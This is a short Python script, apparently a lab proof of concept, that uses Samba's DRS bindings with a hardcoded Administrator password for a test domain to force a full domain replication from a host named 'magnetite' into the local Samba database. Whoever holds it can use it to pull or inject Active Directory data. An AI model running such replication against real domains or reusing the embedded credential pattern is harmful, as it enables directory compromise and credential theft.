import sys
from samba.drs_utils import drs_Replicate
from samba.dcerpc import misc
from samba.credentials import Credentials
from samba.param import LoadParm
from samba.samdb import SamDB
from samba.auth import system_session

lp = LoadParm(); lp.load_default()
creds = Credentials(); creds.guess(lp)
creds.set_username("Administrator"); creds.set_password("Passw0rd!23"); creds.set_domain("MAGTEST.LOCAL")

samdb = SamDB("/var/lib/samba/private/sam.ldb", session_info=system_session(), lp=lp, credentials=creds)
dest_guid = misc.GUID(samdb.get_ntds_GUID())
dest_inv  = misc.GUID(samdb.get_invocation_id())
# magnetite advertises this invocation id in its reply header (fixed PoC value).
src_inv = misc.GUID("4d3c2b1a-6f5e-8170-92a3-b4c5d6e7f809")

binding = "ncacn_ip_tcp:magnetite.magtest.local[1027,seal]"
NC = "DC=magtest,DC=local"
print("[drs] binding", binding, "NC", NC)
repl = drs_Replicate(binding, lp, creds, samdb, dest_inv)
repl.replicate(NC, src_inv, dest_guid, full_sync=True)
print("[drs] REPLICATE returned OK")
